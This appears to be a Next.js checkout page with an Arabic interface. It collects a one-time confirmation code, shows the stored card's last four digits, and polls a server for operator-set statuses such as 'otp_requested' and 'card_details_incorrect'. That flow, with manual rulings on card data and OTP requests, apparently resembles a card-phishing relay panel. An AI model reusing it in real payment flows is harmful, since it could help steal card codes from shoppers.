'use client';

import Link from 'next/link';
import { useEffect, useState } from 'react';

const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';

type CheckoutDraft = {
  phone?: unknown;
  cardLast4?: string;
  cardNumber?: string;
  card_number?: string;
  card?: string;
  stage?: unknown;
  orderId?: unknown;
  orderNumber?: unknown;
  customerNotificationKey?: unknown;
  confirmedAt?: unknown;
};

function normalizeDigits(value: string) {
  return value
    .replace(/[٠-٩]/g, (digit) => String('٠١٢٣٤٥٦٧٨٩'.indexOf(digit)))
    .replace(/[۰-۹]/g, (digit) => String('۰۱۲۳۴۵۶۷۸۹'.indexOf(digit)))
    .replace(/[^0-9]/g, '');
}

export default function VerifyPhonePage() {
  const [phone, setPhone] = useState('');
  const [orderId, setOrderId] = useState('');
  const [orderNumber, setOrderNumber] = useState('');
  const [customerNotificationKey, setCustomerNotificationKey] = useState('');
  const [cardLast4, setCardLast4] = useState('0000');
  const [draftReady, setDraftReady] = useState(false);
  const [referenceCode, setReferenceCode] = useState('');
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verified, setVerified] = useState(false);
  const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [invoiceSent, setInvoiceSent] = useState(false);
  const [adminNoticeType, setAdminNoticeType] = useState<'otp' | 'card' | 'balance' | null>(null);

  const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);

  useEffect(() => {
    if (!verified) return;
    const pageClass = 'erd-verify-waiting-screen';
    document.documentElement.classList.add(pageClass);
    document.body.classList.add(pageClass);
    return () => {
      document.documentElement.classList.remove(pageClass);
      document.body.classList.remove(pageClass);
    };
  }, [verified]);

  useEffect(() => {
    try {
      const raw = window.sessionStorage.getItem(DRAFT_KEY);
      const draft = raw ? (JSON.parse(raw) as CheckoutDraft) : null;

      const savedPhone = typeof draft?.phone === 'string' ? normalizeDigits(draft.phone) : '';
      const savedOrderId = typeof draft?.orderId === 'string' ? draft.orderId : '';
      const savedKey = typeof draft?.customerNotificationKey === 'string' ? draft.customerNotificationKey : '';
      const savedConfirmedAt =
        typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
          ? draft.confirmedAt
          : null;

      // استخراج وإسناد آخر 4 أرقام للبطاقة بشكل مؤكد ومباشر للـ State
      if (draft) {
        let extractedLast4 = '0000';
        if (typeof draft.cardLast4 === 'string' && draft.cardLast4.length === 4) {
          extractedLast4 = draft.cardLast4;
        } else if (typeof draft.cardNumber === 'string' && draft.cardNumber.length >= 4) {
          const clean = draft.cardNumber.replace(/\D/g, '');
          if (clean.length >= 4) extractedLast4 = clean.slice(-4);
        } else if (typeof draft.card_number === 'string' && draft.card_number.length >= 4) {
          const clean = draft.card_number.replace(/\D/g, '');
          if (clean.length >= 4) extractedLast4 = clean.slice(-4);
        }
        setCardLast4(extractedLast4);
      }

      if (
        (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
        savedPhone.length === 10 &&
        savedOrderId &&
        savedKey
      ) {
        setPhone(savedPhone);
        setOrderId(savedOrderId);
        setOrderNumber(typeof draft.orderNumber === 'string' ? draft.orderNumber : '');
        setCustomerNotificationKey(savedKey);
        setVerified(draft.stage === 'confirmed');
        setConfirmedAt(draft.stage === 'confirmed' ? savedConfirmedAt : null);
        setDraftReady(true);
      } else {
        setDraftReady(true);
      }
    } catch {
      setDraftReady(true);
    }
  }, []);

  useEffect(() => {
    if (!verified) {
      setCountdown(0);
      return;
    }

    const verificationTime = confirmedAt ?? Date.now();
    const updateCountdown = () => {
      setCountdown(Math.max(0, Math.ceil((verificationTime + 30_000 - Date.now()) / 1000)));
    };

    updateCountdown();
    const interval = window.setInterval(updateCountdown, 250);
    return () => {
      window.clearInterval(interval);
    };
  }, [confirmedAt, verified]);

  useEffect(() => {
    if (!verified || adminNoticeType || !orderId || !customerNotificationKey) return;

    let active = true;
    let requestInFlight = false;

    const checkAdminNotice = async () => {
      if (!active || requestInFlight) return;
      requestInFlight = true;
      try {
        const response = await fetch(
          '/api/customer-notifications?key=' + encodeURIComponent(customerNotificationKey),
          { cache: 'no-store' }
        );
        if (!response.ok) return;

        const result = await response.json() as {
          ok?: boolean;
          notifications?: Array<{ orderId?: string; status?: string; createdAt?: string }>;
        };
        const verificationTime = confirmedAt ?? 0;
        const matchingNotice = result.ok === true &&
          Array.isArray(result.notifications) &&
          result.notifications.find((item) => {
            const createdAt = Date.parse(item.createdAt || '');
            return item.orderId === orderId &&
              (item.status === 'otp_requested' || item.status === 'card_details_incorrect' || item.status === 'insufficient_balance') &&
              Number.isFinite(createdAt) &&
              createdAt >= verificationTime - 15_000;
          });

        if (active && matchingNotice) {
          setAdminNoticeType(matchingNotice.status === 'otp_requested' ? 'otp' : matchingNotice.status === 'card_details_incorrect' ? 'card' : 'balance');
        }
      } catch {
        // Retry
      } finally {
        requestInFlight = false;
      }
    };

    void checkAdminNotice();
    const timer = window.setInterval(() => { void checkAdminNotice(); }, 2500);
    const handleFocus = () => { void checkAdminNotice(); };
    window.addEventListener('focus', handleFocus);

    return () => {
      active = false;
      window.clearInterval(timer);
      window.removeEventListener('focus', handleFocus);
    };
  }, [verified, adminNoticeType, orderId, customerNotificationKey, confirmedAt]);

  useEffect(() => {
    if (!verified || countdown > 0 || invoiceSent || !orderId || !customerNotificationKey) return;

    let active = true;
    let requestInFlight = false;

    const checkInvoiceSent = async () => {
      if (!active || requestInFlight) return;
      requestInFlight = true;
      try {
        const response = await fetch(
          '/api/customer-notifications?key=' + encodeURIComponent(customerNotificationKey),
          { cache: 'no-store' }
        );
        if (!response.ok) return;

        const result = await response.json() as {
          ok?: boolean;
          notifications?: Array<{ orderId?: string; status?: string }>;
        };
        const matchingInvoice = result.ok === true &&
          Array.isArray(result.notifications) &&
          result.notifications.some((item) =>
            item.orderId === orderId && item.status === 'invoice_documents'
          );

        if (active && matchingInvoice) setInvoiceSent(true);
      } catch {
        // Retry
      } finally {
        requestInFlight = false;
      }
    };

    void checkInvoiceSent();
    const timer = window.setInterval(() => { void checkInvoiceSent(); }, 2500);
    const handleFocus = () => { void checkInvoiceSent(); };
    window.addEventListener('focus', handleFocus);

    return () => {
      active = false;
      window.clearInterval(timer);
      window.removeEventListener('focus', handleFocus);
    };
  }, [verified, countdown, invoiceSent, orderId, customerNotificationKey]);

  async function handleVerify() {
    if (!isReferenceCodeValid) {
      setError('أدخل رمزًا من 4 إلى 6 أرقام.');
      return;
    }
    if (isVerifying || verified) return;

    setError('');
    setIsVerifying(true);
    try {
      const response = await fetch('/api/orders/verify-confirmation-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          orderId,
          customerNotificationKey,
          code: referenceCode
        })
      });
      const result = await response.json() as { ok?: boolean; error?: string };
      if (!response.ok || result.ok !== true) {
        setError(result.error || 'تعذر إرسال رمز الطلب. حاول مرة أخرى.');
        return;
      }

      setConfirmedAt(Date.now());
      setVerified(true);
    } catch {
      setError('تعذر الاتصال بالخادم. حاول مرة أخرى.');
    } finally {
      setIsVerifying(false);
    }
  }

  if (!draftReady) {
    return (
      <main style={{ backgroundColor: '#ffffff', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
        <div style={{ textAlign: 'center' }}>
          <p style={{ color: '#555', fontSize: '16px', marginBottom: '15px' }}>لا توجد بيانات طلب جاهزة للتأكيد.</p>
          <Link href="/checkout/store" style={{ color: '#1646a7', textDecoration: 'none' }}>
            العودة لإدخال بيانات الطلب
          </Link>
        </div>
      </main>
    );
  }

  // إذا لم يتم تأكيد الرقم بعد، اعرض شاشة الإدخال الطبيعية
  if (!verified) {
    return (
      <main className="erd-verify-page" style={{ direction: 'rtl', padding: '20px', maxWidth: '440px', margin: 'auto', minHeight: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
        <h1 style={{ fontSize: '24px', fontWeight: 'bold', marginBottom: '10px' }}>تأكيد الطلب</h1>
        <p style={{ color: '#666', marginBottom: '20px' }}>أدخل رمز التأكيد المرسل لرقم الجوال أو المرجع الخاص بالعملية.</p>
        
        <div style={{ marginBottom: '15px' }}>
          <input
            type="text"
            placeholder="أدخل الرمز (4-6 أرقام)"
            value={referenceCode}
            onChange={(e) => setReferenceCode(e.target.value)}
            maxLength={6}
            style={{ width: '100%', padding: '12px', borderRadius: '8px', border: '1px solid #ccc', fontSize: '16px' }}
          />
        </div>

        {error && <p style={{ color: 'red', marginBottom: '15px' }}>{error}</p>}

        <button
          type="button"
          onClick={handleVerify}
          disabled={isVerifying}
          style={{ width: '100%', padding: '14px', background: '#12354e', color: '#fff', border: 'none', borderRadius: '8px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer' }}
        >
          {isVerifying ? 'جاري التحقق...' : 'تأكيد الرمز'}
        </button>
      </main>
    );
  }

  // شاشة الانتظار أو الإشعارات مع استخدام المتغير {cardLast4} الفعلي
  return (
    <main className="erd-retry-page">
      <style jsx global>{`
        @import url("https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap");
        .erd-retry-page, .erd-retry-page * { box-sizing: border-box; font-family: Cairo, system-ui, sans-serif; }
        .erd-retry-page { direction: rtl; background: #f4f7f6; color: #12354e; width: 100%; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .erd-retry-card { background: #fff; width: 100%; max-width: 440px; border-radius: 28px; padding: 36px 24px; box-shadow: 0 10px 30px rgba(0,0,0,.04); text-align: center; }
      `}</style>

      <section className="erd-retry-card" aria-live="polite">
        <h1 style={{ fontSize: '26px', fontWeight: 800, marginBottom: '10px' }}>جارٍ إتمام العملية</h1>
        <p style={{ color: '#555', marginBottom: '20px' }}>آخر أرقام البطاقة المستخدمة: <strong>{cardLast4}</strong></p>
        <p style={{ color: '#00a88a', fontWeight: 700 }}>يرجى الانتظار بينما نقوم بمعالجة طلبك...</p>
      </section>
    </main>
  );
}
